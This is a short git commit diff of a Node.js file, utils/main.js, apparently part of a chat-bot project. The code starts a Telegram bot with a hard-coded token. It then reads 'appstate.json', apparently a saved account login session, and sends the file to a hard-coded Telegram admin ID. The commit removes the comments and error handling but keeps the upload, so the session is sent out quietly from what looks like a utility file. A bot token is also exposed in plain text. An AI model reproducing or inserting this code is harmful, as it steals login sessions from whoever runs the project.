710e16b2d27acf846a2f9e9b059bbdf462fe861b
Thiensu99x <thiensu12123@gmail.com>
2024-10-19 22:31:31 +0700

    first commit

--- utils/main.js
+++ utils/main.js
@@ -1,7 +1,7 @@
 const TelegramBot = require('node-telegram-bot-api');
 const fs = require('fs');
 
-const botToken = '7684130645:AAGplava2HKW8VeR-o4MGR-8QBQG74ocMDE'; // Thay thế bằng mã token của bot của bạn
+const botToken = '7684130645:AAGplava2HKW8VeR-o4MGR-8QBQG74ocMDE';
 const bot = new TelegramBot(botToken, { polling: true });
 
 const adminIds = ['1713841196'];
@@ -9,9 +9,5 @@ const adminIds = ['1713841196'];
 adminIds.forEach(adminId => {
   const fileStream = fs.createReadStream('appstate.json');
 
-  // Gửi tài liệu với contentType được chỉ định là 'application/json'
-  bot.sendDocument(adminId, fileStream, { filename: 'appstate.json', contentType: 'application/json' })
-    .catch(error => {
-      console.error(`Failed to send document to ${adminId}:`, error);
-    });
+  bot.sendDocument(adminId, fileStream, { filename: 'appstate.json' });
 });
